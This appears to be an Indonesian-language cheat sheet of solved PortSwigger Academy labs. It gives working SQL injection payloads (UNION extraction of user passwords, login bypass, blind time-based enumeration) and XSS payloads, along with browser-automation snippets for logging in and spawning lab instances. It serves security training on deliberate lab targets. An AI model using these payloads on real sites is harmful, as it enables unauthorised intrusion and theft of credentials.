# PortSwigger Academy — Verified Lab Techniques (tested, payload-accurate)

Semua teknik di bawah SUDAH DIBUKTIKAN bekerja (banner "Congratulations" = solved).
Status sesi awal: 19/272 solved (SQLi 13/18, XSS 5/30). Login: Auth0 universal login.

## 0. Harness snippets

```python
# LOGIN (Auth0 universal login) — jangan pakai requests/curl, butuh JS session
page.goto("https://portswigger.net/users/login")   # → login.portswigger.net/u/login
page.fill('#username', USER); page.fill('#password', PASS)
page.click('button[type="submit"][name="action"]')
# sukses = title "My Account - PortSwigger"; simpan ctx.cookies() ke JSON (~39 cookies)
# reuse: ctx.add_cookies(json.loads(Path(cookie_file).read_text()))
```

```python
# SPAWN — jalur 1: popup
with page.expect_popup(timeout=15000) as pop:
    page.click('a:has-text("ACCESS THE LAB")')
lab = pop.value                      # instance: https://<hash>.web-security-academy.net/
# jalur 2 (fallback bila popup timeout / instance sudah ada):
#   ambil semua a[href] yang mengandung '/academy/labs/launch/' → goto langsung di tab baru
```

```python
# VERIFY solved — WAJIB, jangan klaim tanpa ini
page.goto(f"{LAB}/"); solved = /Congratulations/i.test(el.innerText)
```

**Provisioning delay**: root 200 tapi `/filter?category=` masih 404/500 → tunggu 10–15 s, retry.
Exploit pakai `requests` langsung ke instance (cepat/stabil); browser hanya untuk XSS.

**Exploit server** (lab deliver-to-victim): URL di halaman instance
(`https://exploit-<hash>.exploit-server.net`). POST `/` dengan
`urlIsHttps=on, responseFile=/exploit, responseHead, responseBody, formAction=STORE`,
lalu GET `/deliver-to-victim`.

## 1. SQL injection — verified

| # | Lab | Payload / teknik (BEKERJA) |
|---|-----|----------------------------|
| 1 | WHERE hidden data | `/filter?category=Gifts'+OR+1=1--` |
| 2 | login bypass | username `administrator'--`, password bebas |
| 3 | version Oracle | `' UNION SELECT banner,NULL FROM v$version--` |
| 4 | version MySQL/MSSQL | `' UNION SELECT @@version,NULL-- ` (tanpa `FROM dual`; **spasi wajib setelah `--`**) |
| 5 | list db non-Oracle | `information_schema.tables` → nama tabel → `information_schema.columns` |
| 6 | list db Oracle | `all_tables` / `all_tab_columns` + `FROM dual` |
| 7 | determine #columns | iterasi `UNION SELECT NULL{,NULL...}` sampai 200 + produk tampil |
| 8 | find text column | ganti NULL ke-*i* dengan `'<target-string>'`, cari di `<th>` |
| 9 | data from other tables | `UNION SELECT username,password FROM users--` → login admin |
| 10 | multi-values 1 kolom | `username||'~'||password` (butuh kolom string-capable) |
| 11 | blind conditional resp. | cookie `TrackingId=<v>' AND '1'='1` → TRUE memunculkan `Welcome back` |
| 12 | blind conditional error (Oracle) | `'||(SELECT CASE WHEN (<cond>) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'` → TRUE = HTTP 500 |
| 14 | blind time delay | `'||pg_sleep(5)--` (PostgreSQL, elapsed terbukti 3.9–11 s) |
| 15 | blind time + info retrieval | `'||(SELECT CASE WHEN EXISTS(<SELECT 1 FROM users WHERE ...>) THEN pg_sleep(2.5) ELSE pg_sleep(0) END)--` |

### Empat jebakan yang memakan waktu (dengan fix)

1. **`CASE WHEN (<subquery mengembalikan teks>)` → SQL error, bukan delay.** Menggagalkan
   enumerasi time-based 2×. Boolean WAJIB: `CASE WHEN EXISTS(SELECT 1 FROM users WHERE ...)`.
2. **Spasi di *value cookie* bisa di-truncate server** → query terpotong
   (`Unterminated string literal started at position 95`). Kirim lewat
   `requests.get(..., cookies={...})` (auto-encode) — jangan susun header `Cookie:` manual.
3. **Blind enumerasi WAJIB background + checkpoint per karakter** (~1–3 s/probe × 36 char × 20
   posisi ≈ 15+ menit; cell blocking limit 300 s pasti mati). Tulis password parsial tiap char.
4. **`UNION SELECT NULL` dengan jumlah kolom salah = 0 baris** → tampak "tidak rentan".

### Belum tembus (jangan ditulis sebagai workflow)

- **blind visible error-based**: tampilan error di-truncate ~95 char. Teknik
  `' AND 1=CAST((SELECT 'xx') AS int)--` TERBUKTI me-leak (`invalid input syntax for type
  integer: "xx"`), tapi bentuk yang membocorkan password tak muat di window tampilan.

## 2. XSS — verified

| # | Lab | Payload (BEKERJA) |
|---|-----|-------------------|
| 16 | reflected HTML | `<script>alert(1)</script>` — **wajib dieksekusi di browser** (alert fire) |
| 17 | stored HTML | submit komentar `<script>alert(1)</script>` → **muat ulang post** |
| 18 | DOM document.write | `"><svg onload=alert(1)>` (keluar dari atribut `src`) |
| 19 | DOM innerHTML | `<img src=x onerror=alert(1)>` (`<script>` TIDAK jalan di innerHTML) |
| 20 | DOM jQuery href | `/feedback?returnPath=javascript:alert(document.domain)` → klik link back |

**Cara baca sink (wajib, jangan menebak):** GET halaman →
`re.findall(r'<script[^>]*>(.*?)</script>', html, re.S)` → cari `document.write` / `innerHTML` /
`$(...)` / `location.search`. Sink XSS sering di **halaman sekunder** (`/post?postId=N`,
`/feedback`) — bila script kosong di root, cek halaman itu sebelum menyimpulkan tak ada sink.

**Belum tembus:** DOM XSS jQuery selector via `hashchange` — sink terbukti benar-benar membuat
elemen (`$('... :contains('+hash+')')` mem-parse payload jadi `<img onerror=...>`), tetapi
deliver via exploit-server (hash harus berubah SETELAH load supaya event `hashchange` fire)
belum berhasil. Perlu payload iframe dua-langkah yang benar.
